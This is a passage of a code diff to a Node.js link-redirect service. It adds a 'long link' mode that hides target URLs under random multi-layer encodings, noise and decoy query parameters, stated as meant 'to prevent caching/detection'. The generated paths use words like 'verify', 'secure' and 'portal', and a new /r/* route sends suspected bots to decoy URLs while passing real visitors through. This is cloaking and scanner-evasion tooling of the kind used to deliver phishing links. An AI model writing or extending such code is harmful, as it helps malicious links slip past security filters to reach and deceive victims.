@@ -73,7 +73,14 @@ const configSchema = Joi.object({
   DEBUG: Joi.boolean().default(false),
   BULL_BOARD_ENABLED: Joi.boolean().default(true),
   BULL_BOARD_PATH: Joi.string().default('/admin/queues'),
-  CSRF_SECRET: Joi.string().min(32).optional()
+  CSRF_SECRET: Joi.string().min(32).optional(),
+  
+  // Link mode configuration
+  LINK_LENGTH_MODE: Joi.string().valid('short', 'long', 'auto').default('short'),
+  ALLOW_LINK_MODE_SWITCH: Joi.boolean().default(true),
+  LONG_LINK_SEGMENTS: Joi.number().integer().min(3).max(20).default(6),
+  LONG_LINK_PARAMS: Joi.number().integer().min(5).max(30).default(13),
+  LINK_ENCODING_LAYERS: Joi.number().integer().min(2).max(8).default(4)
 });
 
 const { error: configError, value: validatedConfig } = configSchema.validate(process.env, {
@@ -137,6 +144,12 @@ const botBlocks = new promClient.Counter({
 const linkGenerations = new promClient.Counter({
   name: 'link_generations_total',
   help: 'Total number of link generations'
+});
+
+const linkModeCounter = new promClient.Counter({
+  name: 'link_mode_total',
+  help: 'Total number of links by mode',
+  labelNames: ['mode']
 });
 
 // ─── App Initialization ──────────────────────────────────────────────────────
@@ -221,7 +234,7 @@ if (redisClient) {
   });
 
   redirectQueue.process(async (job) => {
-    const { linkId, ip, userAgent, deviceInfo, country } = job.data;
+    const { linkId, ip, userAgent, deviceInfo, country, linkMode } = job.data;
     await logToDatabase({
       type: 'redirect',
       linkId,
@@ -229,6 +242,7 @@ if (redisClient) {
       userAgent,
       deviceInfo,
       country,
+      linkMode,
       timestamp: new Date()
     });
     return { success: true };
@@ -302,7 +316,7 @@ if (validatedConfig.DATABASE_URL && validatedConfig.DATABASE_URL.startsWith('pos
         // Step 1: Create all tables without indexes
         await dbPool.query(`
           CREATE TABLE IF NOT EXISTS links (
-            id VARCHAR(32) PRIMARY KEY,
+            id VARCHAR(64) PRIMARY KEY,
             target_url TEXT NOT NULL,
             created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
             expires_at TIMESTAMP NOT NULL,
@@ -312,6 +326,8 @@ if (validatedConfig.DATABASE_URL && validatedConfig.DATABASE_URL.startsWith('pos
             current_clicks INTEGER DEFAULT 0,
             last_accessed TIMESTAMP,
             status VARCHAR(20) DEFAULT 'active',
+            link_mode VARCHAR(10) DEFAULT 'short',
+            link_metadata JSONB DEFAULT '{}',
             metadata JSONB DEFAULT '{}'
           );
         `);
@@ -319,13 +335,14 @@ if (validatedConfig.DATABASE_URL && validatedConfig.DATABASE_URL.startsWith('pos
         await dbPool.query(`
           CREATE TABLE IF NOT EXISTS clicks (
             id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
-            link_id VARCHAR(32) REFERENCES links(id) ON DELETE CASCADE,
+            link_id VARCHAR(64) REFERENCES links(id) ON DELETE CASCADE,
             ip INET,
             user_agent TEXT,
             device_type VARCHAR(20),
             country VARCHAR(2),
             city TEXT,
             referer TEXT,
+            link_mode VARCHAR(10),
             created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
           );
         `);
@@ -369,63 +386,48 @@ if (validatedConfig.DATABASE_URL && validatedConfig.DATABASE_URL.startsWith('pos
 
         // Step 2: Verify and add any missing columns
         try {
-          // Check if ip column exists in clicks table
-          const ipCheck = await dbPool.query(`
+          // Check if link_mode column exists in links table
+          const linkModeCheck = await dbPool.query(`
             SELECT column_name 
             FROM information_schema.columns 
-            WHERE table_name='clicks' AND column_name='ip'
+            WHERE table_name='links' AND column_name='link_mode'
           `);
           
-          if (ipCheck.rows.length === 0) {
-            logger.info('Adding ip column to clicks table...');
-            await dbPool.query(`ALTER TABLE clicks ADD COLUMN ip INET`);
-            logger.info('✅ Added ip column');
+          if (linkModeCheck.rows.length === 0) {
+            logger.info('Adding link_mode column to links table...');
+            await dbPool.query(`ALTER TABLE links ADD COLUMN link_mode VARCHAR(10) DEFAULT 'short'`);
+            logger.info('✅ Added link_mode column');
           }
         } catch (err) {
-          logger.warn('Could not verify/add ip column:', err.message);
+          logger.warn('Could not verify/add link_mode column:', err.message);
         }
 
         try {
-          // Check if metadata column exists
-          const metadataCheck = await dbPool.query(`
+          // Check if link_metadata column exists
+          const linkMetadataCheck = await dbPool.query(`
             SELECT column_name 
             FROM information_schema.columns 
-            WHERE table_name='links' AND column_name='metadata'
+            WHERE table_name='links' AND column_name='link_metadata'
           `);
           
-          if (metadataCheck.rows.length === 0) {
-            logger.info('Adding metadata column to links table...');
-            await dbPool.query(`ALTER TABLE links ADD COLUMN metadata JSONB DEFAULT '{}'`);
-            logger.info('✅ Added metadata column');
+          if (linkMetadataCheck.rows.length === 0) {
+            logger.info('Adding link_metadata column to links table...');
+            await dbPool.query(`ALTER TABLE links ADD COLUMN link_metadata JSONB DEFAULT '{}'`);
+            logger.info('✅ Added link_metadata column');
           }
         } catch (err) {
-          logger.warn('Could not verify/add metadata column:', err.message);
-        }
-
-        try {
-          // Check if password_hash column exists
-          const passwordHashCheck = await dbPool.query(`
-            SELECT column_name 
-            FROM information_schema.columns 
-            WHERE table_name='links' AND column_name='password_hash'
-          `);
-          
-          if (passwordHashCheck.rows.length === 0) {
-            logger.info('Adding password_hash column to links table...');
-            await dbPool.query(`ALTER TABLE links ADD COLUMN password_hash TEXT`);
-            logger.info('✅ Added password_hash column');
-          }
-        } catch (err) {
-          logger.warn('Could not verify/add password_hash column:', err.message);
+          logger.warn('Could not verify/add link_metadata column:', err.message);
         }
 
         // Step 3: Create indexes separately
         const indexes = [
           { name: 'idx_links_expires', query: 'CREATE INDEX IF NOT EXISTS idx_links_expires ON links(expires_at);' },
           { name: 'idx_links_status', query: 'CREATE INDEX IF NOT EXISTS idx_links_status ON links(status);' },
+          { name: 'idx_links_mode', query: 'CREATE INDEX IF NOT EXISTS idx_links_mode ON links(link_mode);' },
           { name: 'idx_clicks_link_id', query: 'CREATE INDEX IF NOT EXISTS idx_clicks_link_id ON clicks(link_id);' },
           { name: 'idx_clicks_ip', query: 'CREATE INDEX IF NOT EXISTS idx_clicks_ip ON clicks(ip);' },
           { name: 'idx_clicks_created', query: 'CREATE INDEX IF NOT EXISTS idx_clicks_created ON clicks(created_at);' },
+          { name: 'idx_clicks_mode', query: 'CREATE INDEX IF NOT EXISTS idx_clicks_mode ON clicks(link_mode);' },
           { name: 'idx_analytics_type', query: 'CREATE INDEX IF NOT EXISTS idx_analytics_type ON analytics(type);' },
           { name: 'idx_analytics_created', query: 'CREATE INDEX IF NOT EXISTS idx_analytics_created ON analytics(created_at);' },
           { name: 'idx_blocked_ips_expires', query: 'CREATE INDEX IF NOT EXISTS idx_blocked_ips_expires ON blocked_ips(expires_at);' }
@@ -478,6 +480,9 @@ async function updateAnalytics(type, data) {
     botBlocks.inc();
   } else if (type === 'generate') {
     linkGenerations.inc();
+    if (data.mode) {
+      linkModeCounter.labels(data.mode).inc();
+    }
   }
 
   if (dbPool) {
@@ -632,6 +637,13 @@ const PORT = validatedConfig.PORT;
 const ADMIN_USERNAME = validatedConfig.ADMIN_USERNAME;
 const ADMIN_PASSWORD_HASH = validatedConfig.ADMIN_PASSWORD_HASH;
 
+// Link mode configuration
+const LINK_LENGTH_MODE = validatedConfig.LINK_LENGTH_MODE;
+const ALLOW_LINK_MODE_SWITCH = validatedConfig.ALLOW_LINK_MODE_SWITCH;
+const LONG_LINK_SEGMENTS = validatedConfig.LONG_LINK_SEGMENTS;
+const LONG_LINK_PARAMS = validatedConfig.LONG_LINK_PARAMS;
+const LINK_ENCODING_LAYERS = validatedConfig.LINK_ENCODING_LAYERS;
+
 function parseTTL(ttlValue) {
   const defaultTTL = 1800;
   
@@ -681,6 +693,7 @@ const linkRequestCache = new NodeCache({ stdTTL: 60, checkperiod: 10, useClones:
 const failCache = new NodeCache({ stdTTL: 3600, checkperiod: 600, useClones: false, maxKeys: 10000 });
 const deviceCache = new NodeCache({ stdTTL: 300, checkperiod: 60, useClones: false, maxKeys: 50000 });
 const qrCache = new NodeCache({ stdTTL: 3600, checkperiod: 600, useClones: false, maxKeys: 1000 });
+const encodingConfigCache = new NodeCache({ stdTTL: 3600, checkperiod: 600 });
 
 // Login attempt tracking
 const loginAttempts = new Map();
@@ -705,6 +718,17 @@ const stats = {
   byCountry: {},
   byBotReason: {},
   byDevice: { mobile: 0, desktop: 0, tablet: 0, bot: 0 },
+  linkModes: {
+    short: 0,
+    long: 0,
+    auto: 0
+  },
+  linkLengths: {
+    avg: 0,
+    min: Infinity,
+    max: 0,
+    total: 0
+  },
   realtime: {
     lastMinute: [],
     activeLinks: 0,
@@ -715,7 +739,8 @@ const stats = {
     geo: 0,
     linkReq: 0,
     device: 0,
-    qr: 0
+    qr: 0,
+    encoding: 0
   }
 };
 
@@ -736,7 +761,8 @@ io.use((socket, next) => {
     geo: geoCache.keys().length,
     linkReq: linkCache.keys().length,
     device: deviceCache.keys().length,
-    qr: qrCache.keys().length
+    qr: qrCache.keys().length,
+    encoding: encodingConfigCache.keys().length
   };
   
   socket.emit('stats', stats);
@@ -746,6 +772,11 @@ io.use((socket, next) => {
     targetUrl: TARGET_URL,
     botUrls: BOT_URLS,
     maxLinks: MAX_LINKS,
+    linkLengthMode: LINK_LENGTH_MODE,
+    allowLinkModeSwitch: ALLOW_LINK_MODE_SWITCH,
+    longLinkSegments: LONG_LINK_SEGMENTS,
+    longLinkParams: LONG_LINK_PARAMS,
+    linkEncodingLayers: LINK_ENCODING_LAYERS,
     uptime: process.uptime()
   });
 
@@ -762,11 +793,13 @@ io.use((socket, next) => {
           geoCache.flushAll();
           deviceCache.flushAll();
           qrCache.flushAll();
+          encodingConfigCache.flushAll();
           stats.caches = {
             geo: 0,
             linkReq: 0,
             device: 0,
-            qr: 0
+            qr: 0,
+            encoding: 0
           };
           socket.emit('notification', { type: 'success', message: 'Cache cleared successfully' });
           break;
@@ -790,7 +823,12 @@ io.use((socket, next) => {
             targetUrl: TARGET_URL,
             botUrls: BOT_URLS,
             maxLinks: MAX_LINKS,
-            nodeEnv: NODE_ENV
+            nodeEnv: NODE_ENV,
+            linkLengthMode: LINK_LENGTH_MODE,
+            allowLinkModeSwitch: ALLOW_LINK_MODE_SWITCH,
+            longLinkSegments: LONG_LINK_SEGMENTS,
+            longLinkParams: LONG_LINK_PARAMS,
+            linkEncodingLayers: LINK_ENCODING_LAYERS
           });
           break;
         case 'getLinks':
@@ -815,7 +853,8 @@ setInterval(() => {
     geo: geoCache.keys().length,
     linkReq: linkCache.keys().length,
     device: deviceCache.keys().length,
-    qr: qrCache.keys().length
+    qr: qrCache.keys().length,
+    encoding: encodingConfigCache.keys().length
   };
   
   const now = Date.now();
@@ -1198,7 +1237,82 @@ async function getCountryCode(req) {
   return 'XX';
 }
 
-// Encoders
+// ─── COMPLETE ENCODING/DECODING SYSTEM FOR LONG LINKS ────────────────────────
+
+// Enhanced encoders with more variety for longer links
+const longLinkEncoders = [
+  { 
+    name: 'base64', 
+    enc: s => Buffer.from(s).toString('base64'), 
+    dec: s => Buffer.from(s, 'base64').toString() 
+  },
+  { 
+    name: 'base64url', 
+    enc: s => Buffer.from(s).toString('base64url'), 
+    dec: s => Buffer.from(s, 'base64url').toString() 
+  },
+  { 
+    name: 'base64_reverse', 
+    enc: s => Buffer.from(s.split('').reverse().join('')).toString('base64'), 
+    dec: s => Buffer.from(s, 'base64').toString().split('').reverse().join('')
+  },
+  { 
+    name: 'rot13', 
+    enc: s => s.replace(/[a-zA-Z]/g, c => 
+      String.fromCharCode((c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26)
+    ), 
+    dec: s => s.replace(/[a-zA-Z]/g, c => 
+      String.fromCharCode((c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) - 13) ? c : c + 26)
+    ) 
+  },
+  { 
+    name: 'rot5', 
+    enc: s => s.replace(/[0-9]/g, c => ((parseInt(c) + 5) % 10).toString()), 
+    dec: s => s.replace(/[0-9]/g, c => ((parseInt(c) - 5 + 10) % 10).toString())
+  },
+  { 
+    name: 'hex', 
+    enc: s => Buffer.from(s).toString('hex'), 
+    dec: s => Buffer.from(s, 'hex').toString() 
+  },
+  { 
+    name: 'hex_reverse', 
+    enc: s => Buffer.from(s).toString('hex').split('').reverse().join(''), 
+    dec: s => Buffer.from(s.split('').reverse().join(''), 'hex').toString() 
+  },
+  { 
+    name: 'urlencode', 
+    enc: encodeURIComponent, 
+    dec: decodeURIComponent 
+  },
+  { 
+    name: 'double_urlencode', 
+    enc: s => encodeURIComponent(encodeURIComponent(s)), 
+    dec: s => decodeURIComponent(decodeURIComponent(s))
+  },
+  { 
+    name: 'ascii_shift', 
+    enc: s => s.split('').map(c => String.fromCharCode(c.charCodeAt(0) + 3)).join(''), 
+    dec: s => s.split('').map(c => String.fromCharCode(c.charCodeAt(0) - 3)).join('')
+  },
+  { 
+    name: 'binary', 
+    enc: s => s.split('').map(c => c.charCodeAt(0).toString(2).padStart(8, '0')).join(''), 
+    dec: s => s.match(/.{1,8}/g).map(b => String.fromCharCode(parseInt(b, 2))).join('')
+  },
+  { 
+    name: 'octal', 
+    enc: s => s.split('').map(c => c.charCodeAt(0).toString(8)).join(' '), 
+    dec: s => s.split(' ').map(o => String.fromCharCode(parseInt(o, 8))).join('')
+  },
+  { 
+    name: 'reverse', 
+    enc: s => s.split('').reverse().join(''), 
+    dec: s => s.split('').reverse().join('')
+  }
+];
+
+// Original encoders for short links
 const encoders = [
   { name: 'base64url', enc: s => Buffer.from(s).toString('base64url'), dec: s => Buffer.from(s, 'base64url').toString() },
   { name: 'hex', enc: s => Buffer.from(s).toString('hex'), dec: s => Buffer.from(s, 'hex').toString() },
@@ -1223,6 +1337,277 @@ function multiLayerEncode(str) {
   return { encoded: Buffer.from(result).toString('base64url') };
 }
 
+/**
+ * Multi-layer encoding function for long links
+ * Takes a string and applies multiple random encoding layers
+ * Returns encoded string, layers used, and noise added
+ */
+function longLinkMultiLayerEncode(str, options = {}) {
+  const {
+    minLayers = 4,
+    maxLayers = 8,
+    minNoiseBytes = 6,
+    maxNoiseBytes = 16,
+    includeMetadata = true
+  } = options;
+  
+  let result = str;
+  const layers = [];
+  
+  // Generate random noise (variable length)
+  const noiseBytes = minNoiseBytes + Math.floor(Math.random() * (maxNoiseBytes - minNoiseBytes + 1));
+  const noise = crypto.randomBytes(noiseBytes).toString('hex');
+  
+  // Add noise to both ends of the string
+  result = noise + result + noise;
+
+  // Shuffle encoders randomly
+  const shuffled = [...longLinkEncoders].sort(() => Math.random() - 0.5);
+  
+  // Select random number of encoders
+  const layerCount = minLayers + Math.floor(Math.random() * (maxLayers - minLayers + 1));
+  const selected = shuffled.slice(0, layerCount);
+
+  // Apply each encoder sequentially
+  for (const layer of selected) {
+    result = layer.enc(result);
+    layers.push(layer.name);
+  }
+
+  // Triple URL encode the result
+  result = encodeURIComponent(result);
+  result = encodeURIComponent(result);
+  result = encodeURIComponent(result);
+
+  // Return encoded data and metadata
+  return { 
+    encoded: result, 
+    layers: layers.reverse(), // Store in reverse for decoding
+    noise,
+    layerCount: layers.length,
+    totalLength: result.length
+  };
+}
+
+/**
+ * Multi-layer decoding function for long links
+ * Takes encoded string, layers, and noise to reconstruct original
+ */
+function longLinkMultiLayerDecode(encoded, layers, noise) {
+  let result = encoded;
+  
+  // Triple URL decode
+  result = decodeURIComponent(result);
+  result = decodeURIComponent(result);
+  result = decodeURIComponent(result);
+
+  // Apply decoders in the order they were stored
+  for (const layerName of layers) {
+    const layer = longLinkEncoders.find(e => e.name === layerName);
+    if (!layer) throw new Error(`Unknown layer: ${layerName}`);
+    result = layer.dec(result);
+  }
+
+  // Remove noise from both ends if present
+  if (noise && result.startsWith(noise) && result.endsWith(noise)) {
+    result = result.slice(noise.length, -noise.length);
+  }
+
+  return result;
+}
+
+/**
+ * Generate long tracking link
+ * Creates heavily obfuscated URL with multiple path segments and parameters
+ */
+async function generateLongLink(targetUrl, req, options = {}) {
+  const {
+    segments = LONG_LINK_SEGMENTS,
+    params = LONG_LINK_PARAMS,
+    minLayers = 4,
+    maxLayers = LINK_ENCODING_LAYERS,
+    includeFingerprint = true
+  } = options;
+  
+  // Add random fragment and timestamp to prevent caching/detection
+  const timestamp = Date.now();
+  const randomId = crypto.randomBytes(8).toString('hex');
+  const noisyTarget = targetUrl + '#' + randomId + '-' + timestamp;
+
+  // Encode the URL with multiple layers
+  const { encoded, layers, noise, layerCount } = longLinkMultiLayerEncode(noisyTarget, {
+    minLayers,
+    maxLayers
+  });
+  
+  // Store layers and noise as base64url for transport
+  const metadata = { layers, noise, timestamp, randomId };
+  const metadataEnc = Buffer.from(JSON.stringify(metadata)).toString('base64url');
+
+  // Generate random path segments
+  const pathSegments = [];
+  for (let i = 0; i < segments; i++) {
+    const segmentType = i % 3;
+    if (segmentType === 0) {
+      pathSegments.push(crypto.randomBytes(8).toString('hex'));
+    } else if (segmentType === 1) {
+      pathSegments.push(Math.random().toString(36).substring(2, 15).toUpperCase());
+    } else {
+      const words = ['verify', 'session', 'auth', 'secure', 'gate', 'access', 'token', 'portal'];
+      pathSegments.push(words[i % words.length] + crypto.randomBytes(4).toString('hex'));
+    }
+  }
+
+  // Create the path with random segments
+  const path = `/r/${pathSegments.join('/')}/${crypto.randomBytes(16).toString('hex')}`;
+
+  // Generate multiple fake parameters to hide the real ones
+  const paramList = [];
+  const paramKeys = [
+    'sid', 'tok', 'ref', 'utm_src', 'clid', 'ver', 'ts', 'hmac', 'nonce', 
+    '_t', 'cid', 'fid', 'l', 'sig', 'key', 'state', 'code', 'session', 
+    'token', 'auth', 'access', 'refresh', 'expires', 'redirect', 'return'
+  ];
+  
+  // Add timestamp-based parameters
+  const now = Date.now();
+  const fingerprint = includeFingerprint ? 
+    crypto.createHash('md5').update(req.headers['user-agent'] || '' + now).digest('hex').substring(0, 8) : 
+    '';
+  
+  for (let i = 0; i < params; i++) {
+    const key = paramKeys[i % paramKeys.length] + (i > 10 ? `_${Math.floor(i/3)}` : '');
+    
+    let value;
+    if (key.startsWith('l') && !key.includes('_')) {
+      // The 'l' parameter contains the actual layers info (only one of them)
+      value = metadataEnc;
+    } else if (key === 'fp' && fingerprint) {
+      value = fingerprint;
+    } else if (key === 'ts') {
+      value = now.toString(36);
+    } else {
+      // Random values for all other parameters
+      value = crypto.randomBytes(12).toString('base64url').replace(/=/g, '');
+    }
+    
+    paramList.push(`${key}=${value}`);
+  }
+
+  // Shuffle parameters to make it harder to identify the real one
+  const shuffledParams = paramList.sort(() => Math.random() - 0.5);
+
+  // Construct the final URL
+  const protocol = req.protocol || 'https';
+  const host = req.get('host');
+  const url = `${protocol}://${host}${path}?p=${encoded}&${shuffledParams.join('&')}&v=${Math.floor(Math.random()*10)}.${Math.floor(Math.random()*10)}.${Math.floor(Math.random()*100)}`;
+
+  // Log encoding stats
+  logger.debug(`[LONG LINK GENERATED] Length: ${url.length} chars | Layers: ${layerCount} | Segments: ${segments} | Params: ${params}`);
+  
+  return {
+    url,
+    metadata: {
+      length: url.length,
+      layers: layerCount,
+      segments,
+      params: paramList.length,
+      encodedLength: encoded.length
+    }
+  };
+}
+
+/**
+ * Generate short link (original method)
+ */
+function generateShortLink(targetUrl, req) {
+  const { encoded } = multiLayerEncode(targetUrl + '#' + Date.now());
+  const id = crypto.randomBytes(16).toString('hex');
+  const url = `${req.protocol}://${req.get('host')}/v/${id}`;
+  
+  return {
+    url,
+    metadata: {
+      length: url.length,
+      id
+    }
+  };
+}
+
+/**
+ * Decode and extract target from long link
+ */
+async function decodeLongLink(req) {
+  try {
+    // Extract query parameters
+    const query = req.url.split('?')[1] || '';
+    const params = new URLSearchParams(query);
+    const enc = params.get('p') || '';        // Encoded URL
+    
+    // Find the metadata parameter (it could be any 'l' parameter)
+    let metadataEnc = '';
+    for (const [key, value] of params.entries()) {
+      if (key.startsWith('l') && !key.includes('_') && value.length > 50) {
+        metadataEnc = value;
+        break;
+      }
+    }
+
+    // Only attempt decode if both parameters exist
+    if (!enc || !metadataEnc) {
+      return { success: false, reason: 'missing_parameters' };
+    }
+
+    // Parse metadata from base64url
+    let metadata;
+    try {
+      metadata = JSON.parse(Buffer.from(metadataEnc, 'base64url').toString());
+    } catch (e) {
+      return { success: false, reason: 'invalid_metadata' };
+    }
+
+    const { layers, noise } = metadata;
+    
+    if (!layers || !Array.isArray(layers) || !noise) {
+      return { success: false, reason: 'incomplete_metadata' };
+    }
+
+    // Decode the URL
+    let decoded = longLinkMultiLayerDecode(enc, layers, noise);
+
+    // Remove any fragment identifiers
+    const hashIdx = decoded.indexOf('#');
+    if (hashIdx !== -1) decoded = decoded.substring(0, hashIdx);
+
+    // Ensure URL has protocol
+    if (!/^https?:\/\//i.test(decoded)) {
+      decoded = 'https://' + decoded;
+    }
+
+    // Validate the URL
+    try {
+      const urlObj = new URL(decoded);
+      if (!['http:', 'https:'].includes(urlObj.protocol)) {
+        return { success: false, reason: 'invalid_protocol' };
+      }
+      
+      return { 
+        success: true, 
+        target: decoded,
+        metadata: {
+          layers: layers.length,
+          hasNoise: !!noise
+        }
+      };
+    } catch (e) {
+      return { success: false, reason: 'invalid_url' };
+    }
+  } catch (err) {
+    logger.error('Long link decode error:', err);
+    return { success: false, reason: 'decode_error', error: err.message };
+  }
+}
+
 // Health Endpoints
 app.get(['/ping','/health','/healthz','/status'], (req, res) => {
   const healthData = {
@@ -1234,7 +1619,8 @@ app.get(['/ping','/health','/healthz','/status'], (req, res) => {
     stats: {
       totalRequests: stats.totalRequests,
       activeLinks: linkCache.keys().length,
-      botBlocks: stats.botBlocks
+      botBlocks: stats.botBlocks,
+      linkModes: stats.linkModes
     },
     database: dbPool ? 'connected' : 'disabled',
     redis: redisClient?.status === 'ready' ? 'connected' : 'disabled',
@@ -1263,7 +1649,8 @@ app.get('/metrics', async (req, res) => {
       geo: geoCache.keys().length,
       linkReq: linkRequestCache.keys().length,
       device: deviceCache.keys().length,
-      qr: qrCache.keys().length
+      qr: qrCache.keys().length,
+      encoding: encodingConfigCache.keys().length
     },
     memory: {
       rss: process.memoryUsage().rss,
@@ -1278,13 +1665,20 @@ app.get('/metrics', async (req, res) => {
       expired: stats.expiredLinks,
       generated: stats.generatedLinks
     },
+    linkModes: stats.linkModes,
+    linkLengths: stats.linkLengths,
     devices: stats.byDevice,
     realtime: stats.realtime,
     config: {
       linkTTL: LINK_TTL_SEC,
       linkTTLFormatted: formatDuration(LINK_TTL_SEC),
       maxLinks: MAX_LINKS,
-      nodeEnv: NODE_ENV
+      nodeEnv: NODE_ENV,
+      linkLengthMode: LINK_LENGTH_MODE,
+      allowLinkModeSwitch: ALLOW_LINK_MODE_SWITCH,
+      longLinkSegments: LONG_LINK_SEGMENTS,
+      longLinkParams: LONG_LINK_PARAMS,
+      linkEncodingLayers: LINK_ENCODING_LAYERS
     },
     prometheus: await promClient.register.metrics()
   };
@@ -1293,13 +1687,15 @@ app.get('/metrics', async (req, res) => {
   res.send(await promClient.register.metrics());
 });
 
-// Generate Link - FIXED validation with password support
+// Generate Link - WITH LONG/SHORT LINK OPTION
 app.post('/api/generate', csrfProtection, [
   body('url').optional().isURL().withMessage('Valid URL required'),
   body('password').optional().isString().isLength({ min: 6 }).withMessage('Password must be at least 6 characters'),
   body('maxClicks').optional().isInt({ min: 1, max: 10000 }).withMessage('Max clicks must be between 1 and 10000'),
   body('expiresIn').optional().isString(),
-  body('notes').optional().isString().trim().escape()
+  body('notes').optional().isString().trim().escape(),
+  body('linkMode').optional().isIn(['short', 'long', 'auto']).withMessage('Link mode must be short, long, or auto'),
+  body('longLinkOptions').optional().isObject()
 ], async (req, res, next) => {
   try {
     const errors = validationResult(req);
@@ -1313,12 +1709,51 @@ app.post('/api/generate', csrfProtection, [
     const expiresIn = req.body.expiresIn ? parseTTL(req.body.expiresIn) : LINK_TTL_SEC;
     const notes = req.body.notes ? sanitizeHtml(req.body.notes, { allowedTags: [], allowedAttributes: {} }) : '';
     
-    const { encoded } = multiLayerEncode(target + '#' + Date.now());
+    // Determine link mode
+    let linkMode = req.body.linkMode || LINK_LENGTH_MODE;
     
-    const id = crypto.randomBytes(16).toString('hex');
+    // Auto mode: choose based on URL length or other factors
+    if (linkMode === 'auto') {
+      // Use long links for longer URLs or if specifically requested
+      linkMode = (target.length > 100 || req.body.forceLong) ? 'long' : 'short';
+    }
     
+    // Override with admin setting if switching not allowed
+    if (!ALLOW_LINK_MODE_SWITCH) {
+      linkMode = LINK_LENGTH_MODE;
+    }
+
+    let generatedUrl;
+    let linkMetadata = {};
+    let cacheId;
+
+    if (linkMode === 'long') {
+      // Generate long link with configurable options
+      const longLinkOptions = {
+        segments: req.body.longLinkOptions?.segments || LONG_LINK_SEGMENTS,
+        params: req.body.longLinkOptions?.params || LONG_LINK_PARAMS,
+        minLayers: req.body.longLinkOptions?.minLayers || 4,
+        maxLayers: req.body.longLinkOptions?.maxLayers || LINK_ENCODING_LAYERS,
+        includeFingerprint: req.body.longLinkOptions?.includeFingerprint !== false
+      };
+      
+      const result = await generateLongLink(target, req, longLinkOptions);
+      generatedUrl = result.url;
+      linkMetadata = result.metadata;
+      
+      // For long links, store by a hash of the URL for retrieval
+      cacheId = crypto.createHash('md5').update(generatedUrl).digest('hex');
+    } else {
+      // Generate short link (original method)
+      const result = generateShortLink(target, req);
+      generatedUrl = result.url;
+      linkMetadata = result.metadata;
+      cacheId = linkMetadata.id;
+    }
+    
+    // Store link data
     const linkData = {
-      e: encoded,
+      e: linkMode === 'long' ? null : multiLayerEncode(target + '#' + Date.now()).encoded,
       target,
       created: Date.now(),
       expiresAt: Date.now() + (expiresIn * 1000),
@@ -1326,19 +1761,25 @@ app.post('/api/generate', csrfProtection, [
       maxClicks: maxClicks ? parseInt(maxClicks) : null,
       currentClicks: 0,
       notes,
+      linkMode,
+      linkMetadata,
       metadata: {
+        ...linkMetadata,
         userAgent: req.headers['user-agent'],
-        creator: req.session.user || 'anonymous'
+        creator: req.session.user || 'anonymous',
+        ip: req.ip
       }
     };
     
-    linkCache.set(id, linkData, expiresIn);
+    // Store in cache
+    linkCache.set(cacheId, linkData, expiresIn);
     
+    // Store in database if available
     if (dbPool) {
       try {
         await dbPool.query(
-          'INSERT INTO links (id, target_url, created_at, expires_at, creator_ip, password_hash, max_clicks, current_clicks, metadata) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9)',
-          [id, target, new Date(), new Date(Date.now() + (expiresIn * 1000)), req.ip, linkData.passwordHash, linkData.maxClicks, 0, JSON.stringify(linkData.metadata)]
+          'INSERT INTO links (id, target_url, created_at, expires_at, creator_ip, password_hash, max_clicks, current_clicks, link_mode, link_metadata, metadata) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11)',
+          [cacheId, target, new Date(), new Date(Date.now() + (expiresIn * 1000)), req.ip, linkData.passwordHash, linkData.maxClicks, 0, linkMode, JSON.stringify(linkMetadata), JSON.stringify(linkData.metadata)]
         );
       } catch (dbErr) {
         logger.error('Database insert error:', dbErr);
@@ -1348,22 +1789,51 @@ app.post('/api/generate', csrfProtection, [
     stats.generatedLinks++;
     linkGenerations.inc();
     
+    // Update link mode stats
+    stats.linkModes[linkMode] = (stats.linkModes[linkMode] || 0) + 1;
+    
+    // Update link length stats
+    const linkLength = generatedUrl.length;
+    stats.linkLengths.total += linkLength;
+    stats.linkLengths.avg = stats.linkLengths.total / stats.generatedLinks;
+    stats.linkLengths.min = Math.min(stats.linkLengths.min, linkLength);
+    stats.linkLengths.max = Math.max(stats.linkLengths.max, linkLength);
+    
+    // Update Prometheus metrics
+    linkModeCounter.labels(linkMode).inc();
+    
     const response = {
-      url: `${req.protocol}://${req.get('host')}/v/${id}`,
+      url: generatedUrl,
+      mode: linkMode,
       expires: expiresIn,
       expires_human: formatDuration(expiresIn),
-      id: id,
+      id: cacheId,
       created: Date.now(),
       passwordProtected: !!password,
       maxClicks: linkData.maxClicks || null,
-      notes: notes || null
+      notes: notes || null,
+      linkLength: generatedUrl.length,
+      metadata: linkMetadata
     };
     
     io.emit('link-generated', response);
-    logRequest('generate', req, res, { id, passwordProtected: !!password });
+    logRequest('generate', req, res, { 
+      id: cacheId, 
+      mode: linkMode,
+      length: generatedUrl.length,
+      passwordProtected: !!password 
+    });
     
     if (analyticsQueue) {
-      analyticsQueue.add({ type: 'generate', data: { id, passwordProtected: !!password } });
+      analyticsQueue.add({ 
+        type: 'generate', 
+        data: { 
+          id: cacheId, 
+          mode: linkMode,
+          length: generatedUrl.length,
+          passwordProtected: !!password 
+        } 
+      });
     }
     
     res.json(response);
@@ -1375,6 +1845,160 @@ app.post('/api/generate', csrfProtection, [
 app.get('/g', (req, res, next) => {
   req.body = { url: req.query.t };
   app._router.handle(req, res, next);
+});
+
+/**
+ * Decode and redirect endpoint for long links
+ * Handles the /r/* paths, decodes the URL and redirects
+ */
+app.get('/r/*', strictLimiter, async (req, res, next) => {
+  try {
+    const deviceInfo = req.deviceInfo;
+    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || '0.0.0.0';
+    
+    // Rate limiting per IP
+    const ipKey = `r:${ip}`;
+    const requestCount = linkRequestCache.get(ipKey) || 0;
+    
+    if (requestCount >= 3) {
+      logRequest('rate-limit', req, res, { path: 'r', count: requestCount });
+      return res.redirect(BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)]);
+    }
+    
+    linkRequestCache.set(ipKey, requestCount + 1);
+
+    const country = await getCountryCode(req);
+
+    // Bot detection
+    if (isLikelyBot(req)) {
+      logRequest('bot-block', req, res, { reason: 'bot-detection', path: 'r' });
+      return res.redirect(BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)]);
+    }
+
+    // Attempt to decode the long link
+    const decodeResult = await decodeLongLink(req);
+    
